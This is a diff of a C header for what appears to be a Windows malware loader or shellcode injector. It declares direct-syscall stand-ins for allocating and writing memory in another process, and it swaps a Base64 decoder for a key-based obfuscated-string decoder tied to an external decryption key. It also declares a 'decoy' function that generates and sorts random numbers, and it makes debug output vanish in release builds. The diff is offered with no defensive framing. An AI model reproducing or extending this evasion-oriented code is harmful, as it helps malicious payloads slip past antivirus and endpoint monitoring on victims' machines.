@@ -6,6 +6,9 @@
 #include <stdarg.h>
 
 #define DEBUG true // or false
+#define ARRAY_SIZE 1000
+extern unsigned char DECKEY;
+
 typedef enum
 {
     DEBUG_ERROR,
@@ -13,9 +16,14 @@ typedef enum
     DEBUG_SUCCESS
 } DEBUG_TYPE;
 
-void myDebug(DEBUG_TYPE type, const char *format, ...);
+// If DEBUG is true, declare the function normally.
+#if DEBUG
+    void myDebug(DEBUG_TYPE type, const char *format, ...);
+// If DEBUG is false, replace all myDebug calls with a no-op macro.
+#else
+    #define myDebug(type, format, ...) ((void)0)
+#endif
 
-#define ARRAY_SIZE 1000
 
 // Function definition for modules.
 typedef HMODULE(WINAPI *pMod)(LPCSTR);
@@ -31,8 +39,10 @@ See definitions in syscalls.asm.
 extern NTSTATUS CustAVM(HANDLE hProcess, PVOID *BaseAddress, ULONG ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
 extern NTSTATUS CustWVM(HANDLE hProcess, PVOID BaseAddress, PVOID Buffer, SIZE_T BufferSize, PSIZE_T NumberOfBytesWritten);
 
-// Base64Decode function
-char *Bsfd(const char *encoded);
+/**
+ * TODO
+*/
+char *obfs_decode(unsigned char key, char str[]);
 
 /* Decoy function
 This function will generate 1,000 random numbers, sort them, and compute the average.
